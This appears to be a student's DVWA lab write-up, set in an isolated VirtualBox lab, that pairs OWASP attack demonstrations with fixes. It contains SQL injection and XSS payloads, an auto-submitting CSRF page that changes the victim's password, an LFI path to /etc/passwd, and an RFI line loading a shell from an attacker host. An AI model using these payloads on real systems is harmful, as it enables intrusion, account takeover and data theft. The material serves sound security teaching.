# ApexPanet Cybersecurity
# Task3
## WebApp-Sec-Lab — DVWA Attack Scenarios & Mitigations 

> **Purpose:** concise, reproducible notes for an isolated DVWA lab (attacker: Kali, victim: DVWA VM).
> **Warning:** All payloads and steps are intended **only** for isolated lab environments you control. Do **NOT** run these against third-party or production sites.

---

## Objective & Setup

**Objective:** Identify and exploit OWASP Top 10 vulnerabilities inside DVWA, document findings, and implement fixes.

**Environment (example):**

* Host OS: Windows
* Hypervisor: VirtualBox
* VMs:

  * Kali Linux (attacker)
  * DVWA VM (victim) — accessible at `http://192.168.56.103/` (host-only)
* Network: VirtualBox **Host-Only** (isolated lab)
* DVWA credentials (default in lab): `admin` / `password`

---


## Attack Scenarios & Mitigations (detailed)

### 1) SQL Injection (SQLi)

**PoC summary**

* DVWA → *SQL Injection* module.
* Test payloads (in `id` parameter or login form):

  * Bypass:

    ```
    ' OR '1'='1' -- -
    ```
  * Enumerate columns:

    ```
    1' ORDER BY 1 -- -
    1' ORDER BY 2 -- -
    ```
  * UNION dump (adjust column count):

    ```
    -1' UNION SELECT null, database(), user(), version() -- -
    ```
* Tools: manual payloads, Burp Repeater, `sqlmap` for automation (lab only).

**Mitigations**

* Use **prepared statements / parameterized queries** (no string concatenation).
* Strong input validation and output encoding.
* Least-privilege DB user; avoid exposing admin privilege to web app user.
* Proper error handling: don’t leak SQL errors to users.

---

### 2) Cross-Site Scripting (XSS)

#### Stored XSS (PoC)

* DVWA → *XSS (Stored)*.
* Payload (message field):

```html
<script>alert('XSS')</script>
or
<a href="#" onclick="alert('XSS')">click me</a>
```

* Result: alert displays whenever page with stored comment is loaded.

#### Reflected XSS (PoC)

* DVWA → *XSS (Reflected)*.
* Example URL parameter:

```
http://192.168.56.103/vulnerabilities/xss_r/?name=<script>alert('xss')</script>
```

**Mitigations**

* Output encode: `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` in PHP (context-aware escaping).
* CSP header to limit script sources (see Headers section).
* Set cookies `HttpOnly; Secure` to prevent JS from reading session cookies.
* Whitelist input where possible and sanitize HTML with a safe sanitizer if HTML must be allowed.

---

### 3) Cross-Site Request Forgery (CSRF)

**PoC summary**

* Target: password change form.
* Capture legitimate request (via Burp or DevTools) to identify `action`, `method`, and field names (e.g. `password_new`, `password_conf`).
* Example auto-submit PoC file (`pocs/csrf_post.html`):

```html
<!doctype html>
<html><body>
  <form id="csrfForm" action="http://192.168.56.103/vulnerabilities/csrf/" method="POST">
    <input type="hidden" name="password_new" value="hacked123">
    <input type="hidden" name="password_conf" value="hacked123">
  </form>
  <script>document.getElementById('csrfForm').submit();</script>
</body></html>
```

* Host the page on Kali (`python3 -m http.server 8000`) and open it in a browser where victim is logged in → attacker can change password.

**Mitigations**

* Anti-CSRF tokens tied to session & verified server-side.
* Check `Origin`/`Referer` on state-changing requests.
* Use `SameSite` on cookies (e.g., `SameSite=Lax` or `Strict`) and require re-auth for sensitive actions.

---

### 4) Local File Inclusion (LFI) & Remote File Inclusion (RFI)

**PoC summary**

* LFI: supply `?page=../../../../etc/passwd` (or other local files) to a file include param to read local files.
* RFI: supply `?page=http://attacker/shell.txt` (if `allow_url_include` enabled) to include and execute remote code.

**Mitigations**

* Disable `allow_url_include` and consider disabling `allow_url_fopen`.
* Use **whitelist mapping** for includeable pages:

```php
$pages = ['home' => 'home.php', 'about' => 'about.php'];
$key = $_GET['page'] ?? 'home';
if (isset($pages[$key])) include __DIR__ . '/pages/' . $pages[$key];
```

* Use `realpath()` and verify the resolved path is under an allowed directory.
* Restrict PHP with `open_basedir` and run webserver with minimal privileges; restrict outbound HTTP at the firewall.

---

### 5) Burp Suite — Intercept & Intruder Fuzzing

**Basic workflow**

* BurpSuite → Proxy → Intercept On
* Browser → open dvwa login page
* Intercept a login request → modify credentials (Proxy / Intercept).
* Send to Intruder → choose positions for `username` and `password`.
* Attack type:

  * **Cluster bomb** for username×password combos.
  * **Sniper** for single param fuzzing.
* Use `Grep-match` or response length/status to identify successful logins.

**Mitigations**

* Account lockout, rate limiting, multi-factor authentication, and robust session handling.
* Log suspicious attempts and alert on anomalies.

---

### 6) Web Security Headers (Apache)

**Problem encountered**

* `securityheaders.com` rejects private/local IPs:

  > *“Sorry about that... This action was blocked, the address failed validation.”*
  > → Use `curl -I` to verify headers locally.

**Quick local verification**

```bash
curl -I http://192.168.56.103/login.php
```

**Add headers in Apache**

1. Enable headers:

```bash
sudo a2enmod headers
sudo systemctl restart apache2
```

2. Edit your vhost (e.g. `/etc/apache2/sites-available/000-default.conf`) and add:

```apache
<IfModule mod_headers.c>
    Header always set X-Frame-Options "SAMEORIGIN"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Referrer-Policy "no-referrer-when-downgrade"
    Header always set Permissions-Policy "camera=(), microphone=(), geolocation=()"
    Header always set Content-Security-Policy "default-src 'self' 'unsafe-inline' 'unsafe-eval' data:; img-src 'self' data:; style-src 'self' 'unsafe-inline';"
    # Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"  # enable only on HTTPS
</IfModule>
```

3. Test:

```bash
sudo apachectl configtest
sudo systemctl restart apache2
curl -I http://192.168.56.103/login.php
```

**Notes**

* HSTS (`Strict-Transport-Security`) must only be used on HTTPS-enabled vhosts.
* The CSP shown includes `'unsafe-inline'` and `'unsafe-eval'` to avoid breaking DVWA; tighten for production.

---

